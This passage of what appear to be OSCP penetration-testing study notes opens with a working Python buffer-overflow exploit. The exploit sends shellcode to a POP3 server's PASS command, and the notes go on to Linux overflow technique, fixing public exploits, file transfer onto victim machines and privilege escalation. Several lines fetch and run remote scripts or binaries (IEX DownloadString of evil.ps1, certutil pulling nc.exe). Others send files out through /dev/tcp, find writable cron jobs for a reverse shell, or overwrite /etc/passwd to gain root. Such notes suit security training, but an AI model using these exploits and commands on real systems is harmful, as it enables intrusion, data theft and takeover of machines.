<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x31\x55\x17\x03\x55\x17\x83\x48\x2b\xec\xe9\xae\xdc\x72</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4e\x1d\x13\x9b\xab\x2c\x13\xff\xb8\x1f\xa3\x8b\xec\x93</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xd9\x04\x27\x3c\xf6\x2b\x80\x8b\x20\x02\x11\xa7\x11\x05</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\xba\x45\xe5\xa8\x74\x98\xe4\xed\x69\x51\xb4\xa6\xe6\xc4</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x28\xc2\xb3\xd4\xc3\x98\x52\x5d\x30\x68\x54\x4c\xe7\xe2\x0f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4e\x06\x26\x24\xc7\x10\x2b\x01\x91\xab\x9f\xfd\x20\x7d\xee</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x8f\x40\xde\x0c\xd1\x85\xd9\xee\xa4\xff\x19\x92\xbe\xc4</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x48\x4a\xde\xc3\x1b\xec\x3a\xf5\xc8\x6b\xc9\xf9\xa5\xf8</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x95\x1d\x3b\x2c\xae\x1a\xb0\xd3\x60\xab\x82\xf7\xa4\xf7\x51</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\xfd\x5d\x37\xa6\x1d\x3e\xe8\x02\x56\xd3\xfd\x3e\x35\xbc</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x32\x73\xc5\x3c\x5d\x04\xb6\x0e\xc2\xbe\x50\x23\x8b\x18\xa7</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x44\xa6\xdd\x37\xbb\x49\x1e\x1e\x78\x1d\x4e\x08\xa9\x1e\x05</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\x56\xcb\x8a\x98\xf8\xa4\x6a\x48\xb9\x14\x03\x82\x36\x4a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33\xad\x9c\xe3\xde\x54\x77\x06\x14\x56\x69\x7e\x28\x56\x74</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc4\xa5\xb0\x1c\x2a\xe0\x6b\x89\xd3\xa9\xe7\x28\x1b\x64\x82</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6b\x97\x8b\x73\x25\x50\xe1\x67\xd2\x90\xbc\xd5\x75\xae\x6a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x19\x3d\xf1\x81\x54\x5e\xae\xd6\x31\x90\xa7\xb2\xaf\x8b</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\xa0\x2d\x4d\x59\x60\xea\xae\x64\x69\x7f\x8a\x42\x79\xb9</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\xcf\x2d\x15\x42\x99\x9b\xd3\x3c\x6b\x75\x8a\x93\x25\x11</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4b\xd8\xf5\x67\x54\x35\x80\x87\xe5\xe0\xd5\xb8\xca\x64\xd2</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\x36\x15\x1d\x18\xf3\x35\xfc\x88\x0e\xde\x59\x59\xb3\x83</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\xb4\xf0\xbd\xd9\x3c\x89\x39\xc1\x35\x8c\x06\x45\xa6\xfc</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x20\xc8\x53\x17\x61</span><span style="color:#e6db74">&#34;</span>
)

buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2606</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8f\x35\x4a\x5f</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> shellcode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3500</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2606</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">351</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>)

<span style="color:#66d9ef">try</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Sending buffer...&#39;</span>
    s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;192.168.1.23&#39;</span>, <span style="color:#ae81ff">110</span>))
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;USER username</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;PASS {}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(buffer))
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Done&#39;</span>)
<span style="color:#66d9ef">except</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Could not connect to POP3&#39;</span>
</code></pre></div><h1 id="linux-buffer-overflows">Linux Buffer Overflows</h1>
<p><code>edb --run [binary]</code></p>
<p>Double press run. To search for JMP ESP, Ctrl-O, Jump Equivalent to ESP -&gt; EIP, select first region, Find. As per usual, find a suitable place to store the shellcode, by referring to the registers. In Crosfires case, it looks like you can&rsquo;t store much at the ESP, only 7 bytes, so no shellcode can be stored there. We also notice EAX points to the start of the buffer (<code>(setup sound ...</code>), so let&rsquo;s store the shellcode after <code>(setup sound </code>, and use those 7 bytes at ESP to be first-stage shellcode to JMP to EAX + len(<code>(setup sound </code>). Overwrite EIP &gt; JMP to a JMP ESP &gt; JMP ESP &gt; ADD EAX, 12 &gt; JMP EAX &gt; Shellcode.</p>
<p>Note on indirect offset jumping, <code>jmp esp+20</code> is not possible, <code>jmp [esp+20]</code> loads the value at <code>esp+20</code>, which is not intended. Instead, <code>lea eax, [esp+20]; jmp eax</code> or <code>sub esp, 20; jmp esp</code>. <a href="https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289">https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289</a></p>
<p>Note on exploiting crossfire server, run it as a standalone, not in edb, otherwise shell will not respond to commands. <a href="https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289">https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289</a></p>
<h1 id="exploits">Exploits</h1>
<h2 id="searching-exploits">Searching Exploits</h2>
<p>There are many fake exploits in the wild, many often causing harm to your system. Where can you find reliable sources for public exploit code?</p>
<ul>
<li>Exploit Database - <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
<li>SecurityFocus - <a href="https://www.securityfocus.com/vulnerabilities">https://www.securityfocus.com/vulnerabilities</a></li>
</ul>
<p>In Kali, you can use <code>searchsploit [query]</code> to find exploits. Use <code>searchsploit -u</code> to pull latest updates.</p>
<h2 id="customizing-and-fixing-exploits">Customizing and Fixing Exploits</h2>
<p>Many exploits are one shots, meaning if they are unsuccessful, the service will crash. For that reason, never run an exploit without first examining the code and understand the inner workings. Once done, set up a small dev environment which matches the OS version and vulnerable software version, in order to test and improve existing exploits. Once we are fairly certain that our fixed exploit will work on the target machine, we can then proceed to launch it against our victim.</p>
<ol>
<li>Swap the shellcode (chance that the size matters to bypass DEP and ASLR)</li>
<li>Fix the offsets (based on previous knowledge, or debugging)</li>
<li>Hardcoded variables (like server IP)</li>
</ol>
<p>Some C programs are meant to be compiled in a Windows environment, not just linux. To identify them, simply look at the includes, if &ldquo;win&rdquo; is in the name, is most likely for Windows.</p>
<h3 id="linux-compilation">Linux Compilation</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gcc -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span>
gcc -Wl,--hash-style<span style="color:#f92672">=</span>both -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> <span style="color:#75715e"># &#34;error while loading shared libraries: requires glibc 2.5 or later dynamic linker&#34;</span>
gcc -static -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> <span style="color:#75715e"># or this</span>
</code></pre></div><p>Resources:</p>
<ul>
<li>&ldquo;error while loading shared libraries: requires glibc 2.5 or later dynamic linker&rdquo;: <a href="https://stackoverflow.com/a/12075678">https://stackoverflow.com/a/12075678</a></li>
</ul>
<h3 id="windows-compilation">Windows Compilation</h3>
<p>You can compile and run in Linux with mingw-w64 and wine!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">apt install mingw-w64
i686-w64-mingw32-gcc <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span> <span style="color:#75715e"># -lws2_32</span>
i686-w64-mingw32-g++ <span style="color:#f92672">[</span>.cpp<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span>
wine <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span>
</code></pre></div><h3 id="tips">Tips</h3>
<ul>
<li>i686-w64-mingw32-gcc -lws2_32 - <a href="https://stackoverflow.com/a/2033632/4908573">https://stackoverflow.com/a/2033632/4908573</a></li>
<li>Malloc and memcpy, allocate and initialize with null bytes - <a href="https://forums.offensive-security.com/showthread.php?2363-Fixing-643-c-script&amp;p=9453#post9453">https://forums.offensive-security.com/showthread.php?2363-Fixing-643-c-script&amp;p=9453#post9453</a></li>
<li>Adding +1 to pointers is 4 bytes - <a href="https://stackoverflow.com/a/11598369/4908573">https://stackoverflow.com/a/11598369/4908573</a></li>
</ul>
<h1 id="file-transfers">File Transfers</h1>
<p>Antivirus may be triggered by an upload, so be careful when transferring files. One of OffSec&rsquo;s favourite ways to avoid AV is to use legitimate administrative tools during post exploitation phase.</p>
<h2 id="file-transfer-methods">File Transfer Methods</h2>
<p>Unix environments will often have tools such as <code>nc</code>, <code>curl</code>, <code>wget</code> preinstalled, making file transfer simple. However, on Windows, the process is not as straight forward.</p>
<p>Most netcat-like connections provide a non-interactive shell. Interactive commands like <code>ftp</code> on Windows won&rsquo;t work. So we have to transfer files using non-interactive methods.</p>
<h3 id="tftp">TFTP</h3>
<p>Windows XP and 2003. Windows 7, 2008 and above will need to be explicitly added during installation.</p>
<p>Easy, but slow speed of 2kb/sec</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mkdir /tftp <span style="color:#75715e"># DIRECTORY HOSTING FILES</span>
atftpd --daemon --port <span style="color:#ae81ff">69</span> /tftp
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">tftp -i [kali ip] get [file]
</code></pre></div><h3 id="ftp">FTP</h3>
<p>All Windows.</p>
<p>Fast speed of 206kb/sec. Scripts available in OSCP-Notes/scripts</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>apt update <span style="color:#f92672">&amp;&amp;</span> apt install pure-ftpd
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome <span style="color:#75715e"># use user offsec when logging into ftp</span>
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome <span style="color:#75715e"># DIRECTORY HOSTING FILES</span>
chown -R ftpuser:ftpgroup /ftphome/
service pure-ftpd restart
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> open [kali ip] 21&gt; ftp.txt
<span style="color:#66d9ef">echo</span> USER offsec&gt;&gt; ftp.txt # username
<span style="color:#66d9ef">echo</span> ftp&gt;&gt; ftp.txt # password
<span style="color:#66d9ef">echo</span> bin&gt;&gt; ftp.txt # binary mode
<span style="color:#66d9ef">echo</span> GET [file]&gt;&gt; ftp.txt
<span style="color:#66d9ef">echo</span> bye&gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt
# or
<span style="color:#66d9ef">echo</span> open [kali ip] 21&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> USER offsec&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> ftp&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> bin&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> GET [file]&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> bye&gt;&gt;ftp.txt&amp;ftp -v -n -s:ftp.txt
</code></pre></div><h3 id="vbscript-via-http">VBScript via HTTP</h3>
<p>Windows XP, 2003</p>
<p>Moderate speed of 50kb/sec. Scripts available in OSCP-Notes/scripts</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">service apache2 start
<span style="color:#75715e"># /var/www/html # DIRECTORY HOSTING FILES</span>
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
<span style="color:#66d9ef">echo</span> StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Err.Clear &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = Nothing &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = CreateObject(<span style="color:#e6db74">&#34;WinHttp.WinHttpRequest.5.1&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;WinHttp.WinHttpRequest&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;MSXML2.ServerXMLHTTP&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> http.Open <span style="color:#e6db74">&#34;GET&#34;</span>, strURL, False &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> http.Send &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = Nothing &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set fs = CreateObject(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> strData = <span style="color:#e6db74">&#34;&#34;</span> &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> strBuffer = <span style="color:#e6db74">&#34;&#34;</span> &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Next &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> ts.Close &gt;&gt; wget.vbs
cscript wget.vbs http://[kali ip]/[file] [file]
</code></pre></div><h3 id="powershell-via-http">Powershell via HTTP</h3>
<p>Windows 7, 2008 and above</p>
<p>Slow speed of 20kb/sec, but most readily available on most modern Windows OS</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">service apache2 start <span style="color:#75715e"># /var/www/html # DIRECTORY HOSTING FILES</span>
<span style="color:#75715e"># or</span>
python -m SimpleHTTPServer <span style="color:#75715e"># current working dir will be DIRECTORY HOSTING FILES</span>
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> $storageDir = $pwd &gt;wget.ps1
<span style="color:#66d9ef">echo</span> $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $url = <span style="color:#e6db74">&#34;http://[kali ip]/[file]&#34;</span> &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $file = <span style="color:#e6db74">&#34;[file]&#34;</span> &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.177:8000/hello.ps1&#39;) 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">iex(new-object net.webclient).downloadstring(<span style="color:#e6db74">&#34;http://192.168.42.42/evil.ps1)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://192.168.42.42/nc.exe&#34;</span> nc.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">IWR -Uri <span style="color:#e6db74">&#34;http://192.168.42.42/n64.exe&#34;</span> -Outfile <span style="color:#e6db74">&#34;n64.exe&#34;</span>
</code></pre></div><h3 id="debugexe">Debug.exe</h3>
<p>Older 32-bit Windows</p>
<p>Limited to 64kb, slow speed of 3kb/sec, limited to the connection speed of the shell</p>
<p>On Kali:</p>
<pre><code>upx -9 [.exe] # pack and compress a binary you wanna transfer
ls -lah [.exe] # check whether it is less than 64kb
exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.exe] [.bat]`
cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bit finicky though
</code></pre><p>On Windows:</p>
<pre><code># paste
</code></pre><h3 id="ncexe"><code>nc.exe</code></h3>
<p>Requires <code>nc.exe</code> to be already transferred. Allows for two-way transfers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">C:\nc.exe<span style="color:#75715e"> -lvp 4444 &gt; [file] # on Windows</span>
nc [windows ip] 4444 &lt; [file] # on Kali
</code></pre></div><p>Vice versa.</p>
<h3 id="linux-dev-tcp">Linux Dev TCP</h3>
<pre><code>cat file.txt &gt; /dev/tcp/192.168.1.23/4444 # on victim linux
nc -lvp 4444 &gt; file.txt # on Kali
</code></pre><h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<h3 id="linux-kernel-exploits">Linux Kernel Exploits</h3>
<ul>
<li>Linux Kernel 2.6.39 - 3.2.2 (Gentoo / Ubuntu x86/x64) - &lsquo;Mempodipper&rsquo; Local Privilege Escalation:
<ul>
<li><a href="https://www.exploit-db.com/exploits/18411/">https://www.exploit-db.com/exploits/18411/</a></li>
<li><a href="https://www.securityfocus.com/bid/51625/info">https://www.securityfocus.com/bid/51625/info</a></li>
<li>CVE-2012-0056</li>
</ul>
</li>
<li>Linux Kernel 2.6.22 - 3.9 (x86/x64) - &lsquo;Dirty COW /proc/self/mem&rsquo; Race Condition Privilege Escalation (SUID Method):
<ul>
<li><a href="https://www.exploit-db.com/exploits/40616/">https://www.exploit-db.com/exploits/40616/</a></li>
<li>CVE-2016-5195</li>
</ul>
</li>
<li>Linux Kernel 2.2.x/2.4.x (RedHat) - &lsquo;ptrace/kmod&rsquo; Local Privilege Escalation
<ul>
<li><a href="https://www.exploit-db.com/exploits/3/">https://www.exploit-db.com/exploits/3/</a></li>
<li><a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a></li>
<li>CVE-2003-0127</li>
</ul>
</li>
<li>Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV below 1.4.1 - Local Privilege Escalation (1)
<ul>
<li><a href="https://www.exploit-db.com/exploits/8478/">https://www.exploit-db.com/exploits/8478/</a></li>
<li><code>exploit/linux/local/udev_netlink</code></li>
</ul>
</li>
</ul>
<p>Tools:</p>
<ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
<li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></li>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li>
</ul>
<h3 id="windows-kernel-exploits">Windows Kernel Exploits</h3>
<h4 id="poc-exploits">PoC Exploits</h4>
<ul>
<li>&lsquo;afd.sys&rsquo; Local Privilege Escalation
<ul>
<li>Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)
<ul>
<li><a href="https://www.exploit-db.com/exploits/40564/">https://www.exploit-db.com/exploits/40564/</a></li>
<li>Windows XP, 2003, 7, 2008, Vista</li>
</ul>
</li>
<li>Microsoft Windows XP/2003 - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-080)
<ul>
<li><a href="https://www.exploit-db.com/exploits/18176/">https://www.exploit-db.com/exploits/18176/</a></li>
<li>CVE-2011-2005</li>
</ul>
</li>
<li>And a lot more</li>
</ul>
</li>
<li>KiTrap0D/vdmallowed.exe
<ul>
<li><a href="https://www.exploit-db.com/exploits/11199/">https://www.exploit-db.com/exploits/11199/</a></li>
<li>Upload both <code>vdmallowed.exe</code> and <code>vdexploit.dll</code>. May only work on GUI.</li>
<li>CVE-2010-0232</li>
</ul>
</li>
<li>RID Hijacking (Metasploit)
<ul>
<li><a href="https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack">https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack</a></li>
<li><a href="http://csl.com.co/rid-hijacking/">http://csl.com.co/rid-hijacking/</a></li>
</ul>
</li>
<li>And many more &hellip; just search <code>[OS] privilege escalation</code> on Google. Eg. <code>Windows 7 SP1 privilege escalation</code> or <code>Windows 7 SP1 x86 privilege escalation</code></li>
</ul>
<p>To compile C/C++ Windows exploit on Linux:</p>
<ul>
<li><code>i686-w64-mingw32-gcc [.c] -o [.exe] [-lws2_32]</code></li>
<li><code>i686-w64-mingw32-g++ [.cpp] -o [.exe] [-lws2_32]</code></li>
</ul>
<p>To compile Python exploit on Windows:</p>
<ol>
<li>On Windows, install PyWin32</li>
<li>Download and extract Pyinstaller</li>
<li>Open cmd and cd into Pyinstaller</li>
<li><code>python pyinstaller.py --onefile [.py]</code></li>
</ol>
<p>Note: Pywin32 installation error: <a href="https://stackoverflow.com/a/21081675/4908573">https://stackoverflow.com/a/21081675/4908573</a></p>
<p>Resources:</p>
<ul>
<li>Precompiled Windows Kernel Exploits: <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
</ul>
<p>Tools:</p>
<ul>
<li>Windows Exploit Suggester: <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></li>
<li><code>systeminfo</code></li>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
<li>Metasploit Module: <code>post/multi/recon/local_exploit_suggester</code></li>
</ul>
<h2 id="configuration-issues">Configuration Issues</h2>
<h3 id="linux-configuration-issues">Linux Configuration Issues</h3>
<p>What&rsquo;s the OS? What version? What architecture?</p>
<ul>
<li><code>cat /etc/*-release</code></li>
<li><code>uname -i</code></li>
<li><code>lsb_release -a</code> (Debian based OSs)</li>
</ul>
<p>Who are we? Where are we?</p>
<ul>
<li><code>id</code></li>
<li><code>pwd</code></li>
</ul>
<p>Who uses the box? What users? (And which ones have a valid shell)</p>
<ul>
<li><code>cat /etc/passwd</code></li>
<li><code>grep -vE &quot;nologin|false&quot; /etc/passwd</code></li>
</ul>
<p>What&rsquo;s currently running on the box? What active network services are there?</p>
<ul>
<li><code>ps aux</code></li>
<li><code>netstat -antup</code></li>
</ul>
<p>What&rsquo;s installed? What kernel is being used?</p>
<ul>
<li><code>dpkg -l</code> (Debian based OSs)</li>
<li><code>rpm -qa</code> (CentOS / openSUSE)</li>
<li><code>uname -a</code></li>
</ul>
<p>Much more at: <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
<ul>
<li>SUID Files</li>
<li><code>find / -perm -4000 -type f -ls 2&gt; /dev/null</code> find SUID files that are potentially vulnerable (outdated nmap w/ interactive mode, scripts that give you effective root immediately)</li>
<li><code>find / \( -perm -2003 -o -perm -4003 \) -type f -ls 2&gt; /dev/null</code> find SUID/SGID files that are both writable and executable (if you are lucky)</li>
<li><code>find / -perm -002 -type f -ls 2&gt; /dev/null | grep cron</code> find writable cron files (and use it to open a reverse shell)</li>
</ul>
<p>Writable <code>/etc/passwd</code> or <code>/etc/shadow</code></p>
<ul>
<li>Writable <code>/etc/passwd</code>, write password generated from <code>openssl passwd [password]</code> to <code>root:[here]:0:0:root:/root:/bin/bash</code>, then login as root using the password.</li>
</ul>
<p>Find writable tmp folders to do work in:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mount | grep /tmp <span style="color:#75715e"># check if tmp is mounted differently</span>
cd /tmp
<span style="color:#75715e"># or</span>
cd /var/tmp
</code></pre></div><p>Are you a sudo user already? Do you have access to powerful commands like chown or chmod?</p>
